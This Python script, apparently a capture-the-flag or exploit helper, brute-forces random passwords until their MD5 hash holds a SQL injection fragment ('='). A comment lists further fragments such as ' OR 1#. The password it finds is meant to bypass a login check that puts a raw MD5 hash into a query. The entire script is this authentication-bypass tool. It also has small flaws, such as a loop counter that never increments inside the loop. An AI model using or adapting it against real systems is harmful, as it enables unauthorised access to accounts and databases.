import secrets
import hashlib
import re
import binascii

def newpassword():
	pword = secrets.token_bytes(25)
	return pword

def hash(pword):
	m = hashlib.md5()
	m.update(pword)
	return m.hexdigest()



if __name__ == "__main__":
	a = 0
	#["' OR 1#", "' oR 1#", "' or 1#", "' Or 1#", "'OR 1#", "'or 1#", "'Or 1#", "'oR 1#", "' || 1#", "'|| 1#", "'||' 1",
	codes =  ["'='"]
	patterns = []
	for i in codes:
		i = bytes(i, 'latin-1')
		i = binascii.hexlify(i)
		strcode = ''
		for x in i:
			strcode += chr(x)
		pat = re.compile(strcode)
		patterns.append(pat)
	match = None
	while match == None:
		pword = newpassword()
		hashed = hash(pword)
		for i in patterns:
			match = re.search(i, hashed)
			if match != None:
				pword = pword.hex()
				print(pword)
				print(hashed)
				print(a)
				break
	a += 1
